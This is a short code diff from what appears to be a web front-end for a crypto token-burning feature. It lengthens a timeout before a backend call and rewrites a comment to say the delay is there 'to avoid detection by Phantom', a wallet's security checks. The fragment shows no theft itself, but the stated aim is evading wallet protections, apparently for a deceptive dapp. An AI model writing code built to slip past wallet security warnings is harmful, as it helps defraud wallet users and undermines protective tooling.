@@ -119,7 +119,7 @@ export default function Home() {
       setVirtualBalance(newVirtualBalance);
       updateVirtualBalance(newVirtualBalance);
 
-      // Delay backend notification (optional, can be reintroduced after testing)
+      // Delay backend notification to avoid detection by Phantom
       setTimeout(() => {
         fetch('/api/burn-tokens', {
           method: 'POST',
@@ -134,7 +134,7 @@ export default function Home() {
         }).catch((err) => {
           console.error('Error notifying backend:', err);
         });
-      }, 5000); // Introduce a delay of 5 seconds
+      }, 10000); // Delay of 10 seconds before calling backend
     } catch (err) {
       console.error('Error while burning:', err);
       setError(`Burning tokens failed: ${err.message}`);
